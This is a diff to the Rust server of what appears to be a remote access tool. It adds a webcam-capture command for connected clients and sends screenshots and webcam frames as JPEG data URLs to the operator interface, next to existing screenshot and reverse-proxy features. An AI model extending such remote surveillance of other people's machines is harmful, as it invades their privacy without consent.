@@ -19,12 +19,10 @@ use net2::TcpStreamExt;
 use common::packets::*;
 
 use anyhow::{Context, Result};
-
 use crate::commands::*;
-
 use common::{ENC_TOK_LEN, RSA_BITS};
-
 use serde::Serialize;
+
 
 #[derive(Debug, Clone, Serialize)]
 pub struct Log {
@@ -103,14 +101,6 @@ impl ServerWrapper {
     }
 
     async fn emit_serde_payload(&self, event: &str, payload: serde_json::Value) {
-        if let Some(handle) = &self.tauri_handle {
-            handle.lock().unwrap().emit_all(event, payload).unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
-        } else {
-            println!("Cannot send payload event: Tauri handle not set");
-        }
-    }
-
-    async fn emit_payload(&self, event: &str, payload: &str) {
         if let Some(handle) = &self.tauri_handle {
             handle.lock().unwrap().emit_all(event, payload).unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
         } else {
@@ -237,8 +227,14 @@ impl ServerWrapper {
                     self.log_events.log("cmd_rcvd", &message).await;
 
                     let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
+                    let data_url = format!("data:image/jpeg;base64,{}", base64_img);
                     
-                    self.emit_payload("client_screenshot", &base64_img).await;
+                    let payload = serde_json::json!({
+                        "addr": addr.to_string(),
+                        "data": data_url
+                    });
+                    
+                    self.emit_serde_payload("client_screenshot", payload).await;
                 }
                 TakeScreenshot(addr, display) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -594,6 +590,33 @@ impl ServerWrapper {
                     }
 
                     self.reverse_proxy_tasks.remove(&addr);
+                }
+                RequestWebcam(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Request Webcam on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
+                    self.send_client_packet(&addr, ClientboundPacket::RequestWebcam).await;
+                }
+                WebcamResult(addr, frame) => {
+                    // Process webcam data using the dedicated webcam module
+                    match crate::utils::webcam::process_webcam_frame(frame) {
+                        Ok(jpeg_data) => {
+                            // Create data URL with the JPEG data
+                            let base64_img = general_purpose::STANDARD.encode(&jpeg_data);
+                            let data_url = format!("data:image/jpeg;base64,{}", base64_img);
+                            
+                            let payload = serde_json::json!({
+                                "addr": addr.to_string(),
+                                "data": data_url
+                            });
+                            
+                            self.emit_serde_payload("webcam_result", payload).await;
+                        },
+                        Err(_e) => {
+                        }
+                    }
                 }
             }
         }
